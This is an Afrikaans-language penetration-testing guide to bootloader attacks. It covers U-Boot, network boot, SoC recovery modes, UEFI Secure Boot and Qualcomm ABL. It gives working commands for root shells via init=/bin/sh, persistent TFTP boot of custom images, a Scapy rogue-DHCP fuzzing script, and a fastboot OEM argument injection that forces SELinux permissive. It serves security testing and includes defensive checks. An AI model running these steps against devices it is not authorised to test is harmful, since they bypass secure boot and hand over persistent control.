# Bootloader-toetsing

{{#include ../../banners/hacktricks-training.md}}

Die volgende stappe word aanbeveel vir die wysiging van toestel-opstartkonfigurasies en die toetsing van bootloaders soos U-Boot en UEFI-klas-laaiers. Fokus daarop om vroeë code execution te verkry, signature/rollback-beskerming te evalueer, en recovery- of network-boot-paaie te misbruik.

Verwant: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins en environment-misbruik

1. Kry toegang tot die interpreter shell
- Druk tydens boot ’n bekende breeksleutel (dikwels enige sleutel, 0, spasie, of ’n board-spesifieke "magic"-volgorde) voordat `bootcmd` uitgevoer word om na die U-Boot-prompt af te val.

2. Inspekteer boot state en veranderlikes
- Nuttige opdragte:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Wysig boot arguments om ’n root shell te verkry
- Voeg `init=/bin/sh` by sodat die kernel na ’n shell afsak in plaas van die normale init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot vanaf jou TFTP server
- Konfigureer die network en haal ’n kernel/fit image vanaf die LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Maak veranderinge permanent via environment
- As env storage nie write-protected is nie, kan jy beheer permanent maak:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Kontroleer veranderlikes soos `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` wat fallback-paaie beïnvloed. Verkeerd gekonfigureerde waardes kan herhaalde breaks na die shell moontlik maak.

6. Kontroleer debug/unsafe features
- Soek na: `bootdelay` > 0, `autoboot` disabled, onbeperkte `usb start; fatload usb 0:1 ...`, die vermoë om `loady`/`loads` via serial te gebruik, `env import` vanaf untrusted media, en kernels/ramdisks wat gelaai word sonder signature checks.

7. U-Boot image/verification-toetsing
- As die platform secure/verified boot met FIT images beweer, probeer beide unsigned en tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Die afwesigheid van `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` of legacy `verify=n`-gedrag laat dikwels die boot van arbitrêre payloads toe.
- Moenie by ’n eenvoudige allow/deny-resultaat stop nie: onlangse FIT-navorsing het getoon dat die verification path self ’n pre-auth attack surface kan wees. Doen negative testing van ekstern gestoor FIT-data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, en overlay / `extra-conf`-hantering.
- As jy ’n ooreenstemmende source tree het, is `test/vboot/vboot_test.sh` ’n vinnige manier om FIT verification behaviour in U-Boot sandbox te reproduseer voordat jy werklike hardware raak.

8. Standard Boot (`bootstd`), `extlinux`, en script bootflows
- In moderne U-Boot-builds is `bootcmd` dikwels net ’n wrapper rondom Standard Boot. Dit beteken writable media, PXE, of SPI flash kan die werklike trust boundary word, selfs wanneer die sigbare environment onskadelik lyk.
- `extlinux` bootmeth soek `extlinux/extlinux.conf` onder `/` en `/boot`; die script bootmeth soek eerste `boot.scr.uimg` en daarna `boot.scr`. Met network boot kan die script filename vanaf `boot_script_dhcp` kom.
- Nuttige triage-opdragte:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Misbruikgevalle om te toets: attacker-controlled USB/SD-media vroeër in `boot_targets`, writable `/boot/extlinux/extlinux.conf`, rogue TFTP wat `boot.scr` verskaf, of SPI-backed script execution via `script_offset_f`.
- As die platform op FIT verification staatmaak, maak seker dat configurations op configuration-vlak onderteken is en nie slegs per image nie; `required-mode=all` is sterker as om enige enkele required key te aanvaar.

## Network-boot-oppervlak (DHCP/PXE) en rogue servers

9. PXE/DHCP-parameter fuzzing
- U-Boot se legacy BOOTP/DHCP-hantering het memory-safety-kwessies gehad. CVE‑2024‑42040 beskryf byvoorbeeld memory disclosure via crafted DHCP responses wat bytes uit U-Boot memory kan lek terug oor die network. Oefen die DHCP/PXE-codepaaie met té lang/grensgevalwaardes (option 67 bootfile-name, vendor options, file/servername fields) en let op hangs/leaks.
- Minimale Scapy-snippet om boot parameters tydens netboot te stres:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valideer ook of PXE filename fields sonder sanitization aan shell/loader logic oorgedra word wanneer dit aan OS-side provisioning scripts gekoppel word.

10. Rogue DHCP server command injection-toetsing
- Stel ’n rogue DHCP/PXE-service op en probeer karakters in filename- of options fields injecteer om command interpreters in latere fases van die boot chain te bereik. Metasploit se DHCP auxiliary, `dnsmasq`, of custom Scapy scripts werk goed. Maak seker dat jy eers die lab network isoleer.

## SoC ROM recovery modes wat normale boot oorskryf

Baie SoCs stel ’n BootROM-"loader"-mode bloot wat code oor USB/UART sal aanvaar selfs wanneer flash images ongeldig is. As secure-boot fuses nie geblaas is nie, kan dit baie vroeg in die chain arbitrary code execution verskaf.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) of `imx-usb-loader`.
- Voorbeeld: `imx-usb-loader u-boot.imx` om ’n custom U-Boot vanaf RAM te push en uit te voer.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Voorbeeld: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` of `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Voorbeeld: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` om ’n loader te stage en ’n custom U-Boot op te laai.

Evalueer of die toestel secure-boot eFuses/OTP gebrand het. Indien nie, omseil BootROM-downloadmodes dikwels enige hoërvlak-verification (U-Boot, kernel, rootfs) deur jou first-stage payload direk vanaf SRAM/DRAM uit te voer.

## UEFI/PC-klas-bootloaders: vinnige kontroles

11. ESP-tampering, rollback, en key-enrollment-toetsing
- Mount die EFI System Partition (ESP) en kontroleer vir loader-komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Dump Secure Boot-state en key databases vanaf die OS waar moontlik:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- As die platform in Setup Mode is, unauthenticated key enrollment aanvaar, of met ’n test/default Platform Key (PKfail-klas) verskeep word, kan ’n local admin of physical attacker hul eie KEK/db enroll en Secure Boot “enabled” laat lyk terwyl arbitrêre EFI binaries geboot word.
- Probeer boot met downgraded of known-vulnerable signed boot components indien Secure Boot revocations (dbx) nie op datum is nie. As die platform steeds ou shims/bootmanagers vertrou, kan jy dikwels jou eie kernel of `grub.cfg` vanaf die ESP laai om persistence te verkry.

12. Stale shim / SBAT / dbx-revocation-toetsing
- Ou Microsoft-signed shims en vendor forks kan steeds as ’n BYOVD-styl bootkit path optree indien revocations verouderd is. Plaas in ’n geïsoleerde lab ’n histories kwesbare shim op die ESP en probeer om jou eie `grubx64.efi` of kernel te chainload.
- Vinnige triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- As die shim steeds loop ondanks dat dit op die revocation list is, het die firmware/OS stale `dbx` updates of vertrou dit ’n forked loader wat nooit upstream SBAT-beskerming geërf het nie.

13. Boot-logo parsing bugs (LogoFAIL-klas)
- Verskeie OEM/IBV-firmwares was kwesbaar vir image-parsing flaws in DXE wat boot logos verwerk. As ’n aanvaller ’n crafted image op die ESP onder ’n vendor-specific path kan plaas (bv. `\EFI\<vendor>\logo\*.bmp`) en reboot, kan code execution tydens vroeë boot moontlik wees selfs met Secure Boot enabled. Toets of die platform user-supplied logos aanvaar en of daardie paths vanaf die OS writable is.


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Op Android 16-toestelle wat Qualcomm se ABL gebruik om die **Generic Bootloader Library (GBL)** te laai, valideer of ABL die UEFI-app **authenticates** wat dit vanaf die `efisp`-partition laai. As ABL slegs vir ’n UEFI-app se **presence** kontroleer en nie signatures verifieer nie, word ’n write primitive na `efisp` **pre-OS unsigned code execution** tydens boot.

Praktiese kontroles en abuse paths:

- **efisp write primitive**: Jy benodig ’n manier om ’n custom UEFI-app in `efisp` te skryf (root/privileged service, OEM app bug, recovery/fastboot path). Daarsonder is die GBL loading gap nie direk bereikbaar nie.
- **fastboot OEM argument injection** (ABL bug): Sommige builds aanvaar ekstra tokens in `fastboot oem set-gpu-preemption` en voeg dit by die kernel cmdline. Dit kan gebruik word om permissive SELinux af te dwing, wat writes na protected partitions moontlik maak:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
As die device patched is, behoort die command ekstra arguments te reject.
- **Bootloader unlock via persistent flags**: ’n Boot-stage payload kan persistent unlock flags (bv. `is_unlocked=1`, `is_unlocked_critical=1`) verander om `fastboot oem unlock` na te boots sonder OEM server/approval gates. Dit is ’n durable posture change ná die volgende reboot.

Defensive/triage-notas:

- Bevestig of ABL signature verification op die GBL/UEFI-payload vanaf `efisp` uitvoer. Indien nie, behandel `efisp` as ’n high-risk persistence surface.
- Volg op of ABL fastboot OEM-handlers patched is om **argument counts te valideer** en addisionele tokens te reject.

## Hardware-waarskuwing

Wees versigtig wanneer jy tydens vroeë boot met SPI/NAND-flash werk (bv. deur pins te ground om reads te bypass) en raadpleeg altyd die flash-datasheet. Verkeerd getimede shorts kan die toestel of die programmer korrupteer.

## Notas en bykomende wenke

- Probeer `env export -t ${loadaddr}` en `env import -t ${loadaddr}` om environment-blobs tussen RAM en storage te verskuif; sommige platforms laat toe dat env vanaf removable media geïmporteer word sonder authentication.
- Vir persistence op Linux-gebaseerde stelsels wat via `extlinux.conf` boot, is dit dikwels genoeg om die `APPEND`-lyn (om `init=/bin/sh` of `rd.break` te inject) op die boot partition te wysig wanneer geen signature checks afgedwing word nie.
- As die target dual-slot / A/B-updates gebruik, hersien die anti-rollback- en slot-desync-tegnieke in die [firmware analysis overview](README.md) sodat jy nie updater-only trust gaps buite die bootloader self miskyk nie.
- As userland `fw_printenv/fw_setenv` verskaf, valideer dat `/etc/fw_env.config` met die werklike env storage ooreenstem. Verkeerd gekonfigureerde offsets laat jou toe om die verkeerde MTD-region te lees/skryf.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
